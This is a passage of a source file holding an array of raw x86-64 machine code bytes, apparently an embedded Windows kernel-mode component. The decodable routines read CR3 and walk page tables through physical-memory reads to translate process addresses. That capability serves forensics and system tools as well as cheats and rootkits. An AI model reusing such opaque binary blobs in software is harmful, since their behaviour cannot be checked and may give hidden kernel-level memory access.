    0xCF, 0x4C, 0x89, 0xC3, 0x49, 0x89, 0xD7, 0x49, 0x89, 0xCC, 0x48, 0x8B, 0xB4, 0x24, 0x80, 0x00,
    0x00, 0x00, 0x48, 0x89, 0xF1, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x31, 0xC0, 0x45, 0x31, 0xC9,
    0xFF, 0x15, 0x9A, 0x5B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x47, 0x49, 0x89, 0xC6, 0x48, 0x89,
    0xC1, 0x31, 0xD2, 0x49, 0x89, 0xF0, 0xFF, 0x15, 0xEC, 0x5D, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0x4C,
    0x89, 0xFA, 0x4D, 0x89, 0xF0, 0x49, 0x89, 0xF1, 0xE8, 0x23, 0xFC, 0xFF, 0xFF, 0x89, 0xC5, 0x85,
    0xC0, 0x78, 0x11, 0x48, 0x89, 0xD9, 0x48, 0x89, 0xFA, 0x4D, 0x89, 0xF0, 0x49, 0x89, 0xF1, 0xE8,
    0xCC, 0xFD, 0xFF, 0xFF, 0x4C, 0x89, 0xF1, 0x48, 0x89, 0xF2, 0xFF, 0x15, 0x68, 0x5B, 0x00, 0x00,
    0xEB, 0x05, 0xBD, 0x9A, 0x00, 0x00, 0xC0, 0x89, 0xE8, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5D, 0x5F,
    0x5E, 0x41, 0x5C, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x48, 0x83, 0xEC, 0x20, 0x89, 0xD6, 0xFF, 0x15, 0xAB, 0x5B, 0x00, 0x00, 0x48, 0x85, 0xC0,
    0x74, 0x1C, 0x31, 0xC9, 0x83, 0xFE, 0x01, 0x0F, 0x94, 0xC1, 0x83, 0xFE, 0x02, 0x8D, 0x54, 0xC9,
    0x0C, 0xB9, 0x1E, 0x00, 0x00, 0x00, 0x0F, 0x45, 0xCA, 0x48, 0xD3, 0xF8, 0xEB, 0x02, 0x31, 0xC0,
    0x48, 0x83, 0xC4, 0x20, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x89, 0xD6, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x89, 0xD0, 0x48, 0xC1, 0xE8, 0x24, 0x25, 0xF8, 0x0F, 0x00, 0x00, 0x48,
    0x01, 0xC1, 0x31, 0xFF, 0x48, 0x8D, 0x54, 0x24, 0x38, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x45,
    0x31, 0xC9, 0xE8, 0x99, 0xF7, 0xFF, 0xFF, 0x85, 0xC0, 0x78, 0x53, 0x48, 0x8B, 0x44, 0x24, 0x38,
    0xA8, 0x01, 0x74, 0x48, 0x48, 0xBB, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0xC7,
    0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0x21, 0xD8, 0x48, 0x89, 0xF1, 0x48, 0xC1, 0xE9,
    0x1B, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x31, 0xFF, 0x48, 0x8D, 0x54, 0x24,
    0x30, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC9, 0xE8, 0x51, 0xF7, 0xFF, 0xFF, 0x85,
    0xC0, 0x78, 0x0B, 0x48, 0x8B, 0x44, 0x24, 0x30, 0xA8, 0x01, 0x75, 0x0D, 0x31, 0xFF, 0x48, 0x89,
    0xF8, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0x5F, 0x5E, 0xC3, 0x84, 0xC0, 0x0F, 0x88, 0x92, 0x00, 0x00,
    0x00, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x21, 0xD8, 0x89, 0xF1, 0xC1,
    0xE9, 0x12, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x31, 0xFF, 0x48, 0x8D, 0x54,
    0x24, 0x28, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC9, 0xE8, 0x00, 0xF7, 0xFF, 0xFF,
    0x85, 0xC0, 0x78, 0xBA, 0x48, 0x8B, 0x44, 0x24, 0x28, 0xA8, 0x01, 0x74, 0xAF, 0x84, 0xC0, 0x78,
    0x66, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0x21, 0xD8, 0x89, 0xF1, 0xC1,
    0xE9, 0x09, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x31, 0xFF, 0x48, 0x8D, 0x54,
    0x24, 0x20, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC9, 0xE8, 0xC0, 0xF6, 0xFF, 0xFF,
    0x85, 0xC0, 0x0F, 0x88, 0x76, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xA8, 0x01, 0x0F,
    0x84, 0x67, 0xFF, 0xFF, 0xFF, 0x48, 0x21, 0xD8, 0x81, 0xE6, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x09,
    0xC6, 0xEB, 0x0C, 0x48, 0x21, 0xD8, 0x81, 0xE6, 0xFF, 0xFF, 0xFF, 0x3F, 0x48, 0x01, 0xC6, 0x48,
    0x89, 0xF7, 0xE9, 0x47, 0xFF, 0xFF, 0xFF, 0x48, 0x21, 0xD8, 0x81, 0xE6, 0xFF, 0xFF, 0x1F, 0x00,
    0xEB, 0xEA, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0xA8,
    0x00, 0x00, 0x00, 0x4C, 0x89, 0x44, 0x24, 0x30, 0x4D, 0x85, 0xC9, 0x0F, 0x84, 0x7D, 0x02, 0x00,
    0x00, 0x4C, 0x89, 0xCF, 0x4D, 0x89, 0xC6, 0x48, 0x89, 0xD6, 0xE8, 0x71, 0xFE, 0xFF, 0xFF, 0x48,
    0x85, 0xC0, 0x74, 0x6E, 0x48, 0x89, 0xC3, 0x48, 0x89, 0x37, 0x48, 0x89, 0x47, 0x08, 0x4C, 0x89,
    0x77, 0x10, 0x48, 0x8D, 0x54, 0x24, 0x60, 0x41, 0xB8, 0x40, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC1,
    0x45, 0x31, 0xC9, 0xE8, 0x18, 0xF6, 0xFF, 0xFF, 0x85, 0xC0, 0x78, 0x69, 0x45, 0x31, 0xF6, 0x4C,
    0x8D, 0x7C, 0x24, 0x3B, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x49, 0x83, 0xFE, 0x0C, 0x73, 0x63, 0x4A, 0x8D, 0x0C, 0x34, 0x48, 0x83, 0xC1, 0x60, 0x4C, 0x89,
    0xFA, 0xE8, 0x2A, 0xAD, 0xFF, 0xFF, 0x0F, 0xB6, 0x44, 0x24, 0x3B, 0x49, 0x01, 0xC6, 0x48, 0x85,
    0xC0, 0x75, 0xDD, 0x4C, 0x89, 0x77, 0x40, 0x4D, 0x85, 0xF6, 0x74, 0x31, 0x4C, 0x8D, 0x6F, 0x40,
    0xEB, 0x3F, 0x48, 0x8D, 0x0D, 0xF4, 0x18, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x5E, 0x46, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xC1, 0x35, 0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0x28, 0x5B, 0x00, 0x00,
    0xE9, 0xD9, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x40, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D,
    0x0A, 0x37, 0x00, 0x00, 0xE9, 0xB1, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x6F, 0x40, 0x4C, 0x89, 0x77,
    0x40, 0x48, 0x8D, 0x0D, 0x42, 0x2B, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x25, 0x46, 0x00, 0x00, 0x4C,
    0x8D, 0x05, 0x82, 0x35, 0x00, 0x00, 0x4D, 0x89, 0xF1, 0xFF, 0x15, 0xE9, 0x5A, 0x00, 0x00, 0x4C,
    0x8B, 0x47, 0x40, 0x4C, 0x8D, 0x7F, 0x20, 0x48, 0x89, 0xD9, 0x4C, 0x89, 0xFA, 0x45, 0x31, 0xC9,
    0xE8, 0x5B, 0xF5, 0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x88, 0x66, 0x01, 0x00, 0x00, 0x4D, 0x8B, 0x65,
    0x00, 0xB9, 0x00, 0x01, 0x00, 0x00, 0xE8, 0xE5, 0xD4, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x0F, 0x84,
    0x3E, 0x01, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x48, 0x89, 0xC1, 0x4C, 0x89, 0xFA, 0x4D, 0x89, 0xE0,
    0xFF, 0x15, 0xAA, 0x5A, 0x00, 0x00, 0x49, 0x8D, 0x04, 0x34, 0x48, 0x89, 0x44, 0x24, 0x60, 0x4B,
    0x8D, 0x0C, 0x26, 0x48, 0x8D, 0x15, 0x16, 0x15, 0x00, 0x00, 0x41, 0xB8, 0x0C, 0x00, 0x00, 0x00,
    0xFF, 0x15, 0x8A, 0x5A, 0x00, 0x00, 0x4B, 0x8D, 0x0C, 0x26, 0x48, 0x83, 0xC1, 0x02, 0x48, 0x8D,
    0x54, 0x24, 0x60, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x71, 0x5A, 0x00, 0x00, 0x4C,
    0x89, 0xF1, 0xBA, 0x00, 0x01, 0x00, 0x00, 0x41, 0xB8, 0x40, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x0D,
    0x58, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0xD7, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x77, 0x18, 0x48,
    0x8D, 0x15, 0xCA, 0x14, 0x00, 0x00, 0x4C, 0x8D, 0x74, 0x24, 0x3B, 0x41, 0xB8, 0x0C, 0x00, 0x00,
    0x00, 0x4C, 0x89, 0xF1, 0xFF, 0x15, 0x36, 0x5A, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x3D, 0x48,
    0x8D, 0x54, 0x24, 0x30, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x20, 0x5A, 0x00, 0x00,
    0x41, 0xB8, 0x0C, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x4C, 0x89, 0xF2, 0x45, 0x31, 0xC9, 0xE8,
    0xBC, 0xF5, 0xFF, 0xFF, 0x85, 0xC0, 0x40, 0x0F, 0x99, 0xC5, 0x0F, 0x88, 0xC6, 0x00, 0x00, 0x00,
    0x49, 0x83, 0x7D, 0x00, 0x0D, 0x72, 0x52, 0x4C, 0x8D, 0x74, 0x24, 0x60, 0x41, 0xB8, 0x20, 0x00,
    0x00, 0x00, 0x4C, 0x89, 0xF1, 0xBA, 0x90, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xE8, 0x59, 0x00, 0x00,
    0x4D, 0x8B, 0x45, 0x00, 0x49, 0x83, 0xC0, 0xF4, 0x48, 0x89, 0xD9, 0x48, 0x83, 0xC1, 0x0C, 0x4C,
    0x89, 0xF2, 0x45, 0x31, 0xC9, 0xE8, 0x76, 0xF5, 0xFF, 0xFF, 0x85, 0xC0, 0x79, 0x1B, 0x48, 0x8D,
    0x0D, 0x6E, 0x35, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xE8, 0x44, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x35,
    0x34, 0x00, 0x00, 0xFF, 0x15, 0x9F, 0x59, 0x00, 0x00, 0xC6, 0x47, 0x48, 0x01, 0x48, 0x89, 0x5C,
    0x24, 0x20, 0x48, 0x8D, 0x0D, 0xB7, 0x4A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xA6, 0x44, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x11, 0x34, 0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0x78, 0x59, 0x00, 0x00,
    0xEB, 0x2E, 0x48, 0xC7, 0x47, 0x18, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x7A, 0x36, 0x00,
    0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0xCC, 0x29, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x7D, 0x44, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0xE0, 0x33, 0x00, 0x00, 0xFF, 0x15, 0x4A, 0x59, 0x00, 0x00, 0x31, 0xED,
    0x89, 0xE8, 0x48, 0x81, 0xC4, 0xA8, 0x00, 0x00, 0x00, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41,
    0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x48, 0x8D, 0x0D, 0xC3, 0x29, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0x4A, 0x44, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xAD, 0x33, 0x00, 0x00, 0xFF, 0x15, 0x17, 0x59, 0x00,
    0x00, 0x48, 0x8B, 0x4F, 0x18, 0xBA, 0x00, 0x01, 0x00, 0x00, 0xFF, 0x15, 0xC8, 0x56, 0x00, 0x00,
    0xEB, 0xBE, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x49, 0x89, 0xC9, 0x83, 0x3D, 0x62, 0x56, 0x00, 0x00, 0x00, 0x74, 0x1F,
    0x48, 0x8D, 0x0D, 0x7A, 0x28, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xF8, 0x43, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x73, 0x3A, 0x00, 0x00, 0xFF, 0x15, 0xCD, 0x58, 0x00, 0x00, 0xB0, 0x01, 0xEB, 0x16, 0x4C,
    0x39, 0x0D, 0x52, 0x57, 0x00, 0x00, 0x0F, 0x96, 0xC1, 0x4C, 0x39, 0x0D, 0x40, 0x57, 0x00, 0x00,
    0x0F, 0x93, 0xC0, 0x20, 0xC8, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x49, 0x89, 0xC9, 0x49, 0xC1, 0xE9, 0x0C, 0x83, 0x3D, 0x0E, 0x56, 0x00,
    0x00, 0x00, 0x74, 0x1F, 0x48, 0x8D, 0x0D, 0x26, 0x28, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xA4, 0x43,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0x1F, 0x3A, 0x00, 0x00, 0xFF, 0x15, 0x79, 0x58, 0x00, 0x00, 0xB0,
    0x01, 0xEB, 0x16, 0x4C, 0x39, 0x0D, 0xFE, 0x56, 0x00, 0x00, 0x0F, 0x96, 0xC1, 0x4C, 0x39, 0x0D,
    0xEC, 0x56, 0x00, 0x00, 0x0F, 0x93, 0xC0, 0x20, 0xC8, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x0D, 0xFF, 0x15, 0xC1, 0x56, 0x00, 0x00, 0x84,
    0xC0, 0x0F, 0x95, 0xC0, 0xEB, 0x02, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x89, 0xD6, 0x48, 0x85, 0xC9, 0x74, 0x45, 0x48, 0x89,
    0xCF, 0xFF, 0x15, 0xD1, 0x56, 0x00, 0x00, 0x89, 0xC1, 0xB0, 0x01, 0x81, 0xF9, 0x03, 0x01, 0x00,
    0x00, 0x74, 0x50, 0x48, 0x8B, 0x1D, 0x0E, 0x58, 0x00, 0x00, 0x48, 0x89, 0xF9, 0xFF, 0x15, 0xB5,
    0x56, 0x00, 0x00, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x7F, 0x4A, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x19, 0x43, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x0C, 0x34, 0x00, 0x00, 0x41, 0x89, 0xF1, 0xFF,
    0xD3, 0xEB, 0x1E, 0x48, 0x8D, 0x0D, 0x23, 0x32, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xFD, 0x42, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0xF0, 0x33, 0x00, 0x00, 0x41, 0x89, 0xF1, 0xFF, 0x15, 0xC7, 0x57, 0x00,
    0x00, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD6, 0x48, 0x85, 0xC9, 0x74, 0x34, 0x48, 0x89, 0xCF,
    0xFF, 0x15, 0x42, 0x56, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x30, 0x48, 0x89, 0xF9, 0xFF, 0x15, 0x45,
    0x56, 0x00, 0x00, 0x89, 0xC1, 0xB0, 0x01, 0x81, 0xF9, 0x03, 0x01, 0x00, 0x00, 0x74, 0x3B, 0x48,
    0x89, 0xF9, 0xFF, 0x15, 0x28, 0x56, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x87, 0x2F, 0x00, 0x00, 0xEB,
    0x10, 0x48, 0x8D, 0x0D, 0x48, 0x2F, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0xF8, 0x20, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x86, 0x42, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x0E, 0x2F, 0x00, 0x00, 0x41,
    0x89, 0xF1, 0xFF, 0x15, 0x50, 0x57, 0x00, 0x00, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0xFF, 0x25, 0xD4, 0x55, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x4D, 0x89, 0xC1, 0x48, 0x8D, 0x05, 0xDA, 0x49, 0x00, 0x00, 0x81, 0xF9,
    0xFF, 0x01, 0x00, 0x00, 0x77, 0x15, 0x81, 0xFA, 0x00, 0x02, 0x00, 0x00, 0x77, 0x0D, 0xB0, 0x01,
    0x39, 0xD1, 0x72, 0x28, 0x48, 0x8D, 0x05, 0xCE, 0x20, 0x00, 0x00, 0x89, 0x54, 0x24, 0x28, 0x89,
    0x4C, 0x24, 0x20, 0x48, 0x8D, 0x15, 0x14, 0x42, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x69, 0x34, 0x00,
    0x00, 0x48, 0x89, 0xC1, 0xFF, 0x15, 0xDE, 0x56, 0x00, 0x00, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x38,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0x20, 0xD8, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x81, 0xEC, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0x41, 0xB8, 0x10, 0x01,
    0x00, 0x00, 0x31, 0xD2, 0xE8, 0xA7, 0x7F, 0xFF, 0xFF, 0xC7, 0x44, 0x24, 0x24, 0x14, 0x01, 0x00,
    0x00, 0x48, 0x8D, 0x4C, 0x24, 0x24, 0xFF, 0x15, 0x54, 0x56, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x30,
    0x48, 0x81, 0xC4, 0x38, 0x01, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x68,
    0x06, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x50, 0x06, 0x00, 0x00, 0x48, 0x89, 0xD6, 0x48, 0x89,
    0xCF, 0x48, 0x8D, 0x54, 0x24, 0x28, 0xFF, 0x15, 0x14, 0x55, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88,
    0x7F, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x89, 0xFA, 0xE8, 0x00, 0xFE, 0xFF, 0xFF,
    0x84, 0xC0, 0x0F, 0x84, 0x60, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x89, 0xFA, 0xE8,
    0x6C, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x84, 0xC0, 0x0F, 0x84, 0x4C, 0x02, 0x00,
    0x00, 0xFF, 0x15, 0x11, 0x55, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x2E, 0x02, 0x00, 0x00,
    0x48, 0x89, 0xC7, 0x48, 0x8D, 0x9C, 0x24, 0x68, 0x01, 0x00, 0x00, 0x41, 0xB8, 0xE8, 0x02, 0x00,
    0x00, 0x48, 0x89, 0xD9, 0x31, 0xD2, 0xE8, 0xF5, 0x7E, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x28,
    0x41, 0xB9, 0xE8, 0x02, 0x00, 0x00, 0x48, 0x89, 0xFA, 0x49, 0x89, 0xD8, 0xE8, 0x2F, 0xF4, 0xFF,
    0xFF, 0x85, 0xC0, 0x0F, 0x88, 0xF5, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0x80, 0x01, 0x00,
    0x00, 0x48, 0x85, 0xD2, 0x0F, 0x84, 0xE4, 0x01, 0x00, 0x00, 0x80, 0x7A, 0x04, 0x00, 0x0F, 0x84,
    0xDA, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x2E, 0x0F, 0x57, 0xF6, 0x0F, 0x29, 0x74, 0x24, 0x40, 0x66,
    0x85, 0xED, 0x74, 0x16, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0x48, 0x89, 0xF2, 0xFF, 0x15, 0x3E, 0x55,
    0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0x80, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x80, 0x00,
    0x00, 0x00, 0x0F, 0x29, 0x74, 0x24, 0x70, 0x0F, 0x29, 0x74, 0x24, 0x60, 0x0F, 0x29, 0x74, 0x24,
    0x50, 0x48, 0xC7, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C,
    0x24, 0x28, 0x4C, 0x8D, 0x44, 0x24, 0x50, 0x41, 0xB9, 0x48, 0x00, 0x00, 0x00, 0xE8, 0xAE, 0xF3,
    0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x88, 0x74, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x6C, 0x24, 0x60, 0x0F,
    0x57, 0xF6, 0x48, 0x8D, 0xB4, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0xBC, 0x24, 0x50, 0x04,
    0x00, 0x00, 0x48, 0x8D, 0x5C, 0x24, 0x30, 0x4C, 0x8D, 0x74, 0x24, 0x40, 0x4D, 0x89, 0xEF, 0x0F,
    0x29, 0xB4, 0x24, 0x50, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x40, 0x01, 0x00, 0x00, 0x0F,
    0x29, 0xB4, 0x24, 0x30, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x20, 0x01, 0x00, 0x00, 0x0F,
    0x29, 0xB4, 0x24, 0x10, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x00, 0x01, 0x00, 0x00, 0x0F,
    0x29, 0xB4, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x0F,
    0x29, 0xB4, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x0F,
    0x29, 0xB4, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48,
    0xC7, 0x84, 0x24, 0x60, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28,
    0x41, 0xB9, 0xC8, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xFA, 0x49, 0x89, 0xF0, 0xE8, 0xFF, 0xF2, 0xFF,
    0xFF, 0x85, 0xC0, 0x0F, 0x88, 0xFC, 0x00, 0x00, 0x00, 0x66, 0x85, 0xED, 0x75, 0x11, 0x4C, 0x8B,
    0xA4, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xE4, 0x0F, 0x85, 0x10, 0x01, 0x00, 0x00, 0x41,
    0xB8, 0x00, 0x02, 0x00, 0x00, 0x48, 0x89, 0xF9, 0x31, 0xD2, 0xE8, 0x81, 0x7D, 0xFF, 0xFF, 0x0F,
    0xB7, 0x84, 0x24, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x85, 0xC0, 0x74, 0x63, 0x48, 0x8B, 0x94, 0x24,
    0x00, 0x01, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x74, 0x56, 0x0F, 0xB7, 0xC8, 0x81, 0xF9, 0xFE, 0x01,
    0x00, 0x00, 0xB9, 0xFE, 0x01, 0x00, 0x00, 0x0F, 0x42, 0xC8, 0x44, 0x0F, 0xB7, 0xC9, 0x48, 0x8B,
    0x4C, 0x24, 0x28, 0x49, 0x89, 0xF8, 0xE8, 0x95, 0xF2, 0xFF, 0xFF, 0x85, 0xC0, 0x78, 0x30, 0x48,
    0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x84, 0x24, 0xF8, 0x00, 0x00, 0x00, 0x89,
    0x44, 0x24, 0x30, 0x48, 0x89, 0x7C, 0x24, 0x38, 0x48, 0x89, 0xD9, 0x4C, 0x89, 0xF2, 0x41, 0xB0,
    0x01, 0xFF, 0x15, 0xC9, 0x53, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0xA7, 0x00, 0x00, 0x00, 0x0F,
    0x29, 0x74, 0x24, 0x30, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x41, 0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C,
    0x89, 0xFA, 0x49, 0x89, 0xD8, 0xE8, 0x46, 0xF2, 0xFF, 0xFF, 0x85, 0xC0, 0x78, 0x50, 0x4C, 0x8B,
    0x7C, 0x24, 0x30, 0x4D, 0x39, 0xEF, 0x0F, 0x85, 0xB3, 0xFE, 0xFF, 0xFF, 0xEB, 0x5E, 0x48, 0x8B,
    0x4C, 0x24, 0x28, 0xE8, 0x98, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xFF, 0x15, 0xDD,
    0x52, 0x00, 0x00, 0x45, 0x31, 0xE4, 0x4C, 0x89, 0xE0, 0x0F, 0x28, 0xB4, 0x24, 0x50, 0x06, 0x00,
    0x00, 0x48, 0x81, 0xC4, 0x68, 0x06, 0x00, 0x00, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D,
    0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x48, 0x8D, 0x0D, 0x37, 0x3B, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D,
    0x0D, 0xF3, 0x3A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xB2, 0x3E, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC4,
    0x2F, 0x00, 0x00, 0x41, 0x89, 0xC1, 0xFF, 0x15, 0x7C, 0x53, 0x00, 0x00, 0x45, 0x31, 0xE4, 0x48,
    0x8B, 0x4C, 0x24, 0x28, 0xE8, 0x37, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xFF, 0x15,
